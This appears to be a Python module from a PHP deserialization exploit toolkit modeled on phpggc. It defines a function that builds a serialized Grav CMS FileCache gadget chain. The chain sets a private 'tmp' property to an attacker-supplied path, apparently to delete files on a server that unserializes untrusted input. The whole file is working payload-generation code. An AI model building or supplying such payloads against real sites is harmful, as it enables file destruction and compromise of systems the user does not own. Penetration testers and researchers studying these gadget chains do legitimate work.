"""Grav gadget chains — byte-identical to ambionics/phpggc."""
from __future__ import annotations

from ..platform import maybe_wrap
from ..serialize import php_obj, php_str, priv


def build_fd1(remote_path: str, *, fast_destruct: bool = False) -> bytes:
    cache = php_obj("Grav\\Framework\\Cache\\Adapter\\FileCache", [
        (priv("Grav\\Framework\\Cache\\Adapter\\FileCache", "tmp"), php_str(remote_path)),
    ])
    return maybe_wrap(cache, fast_destruct)
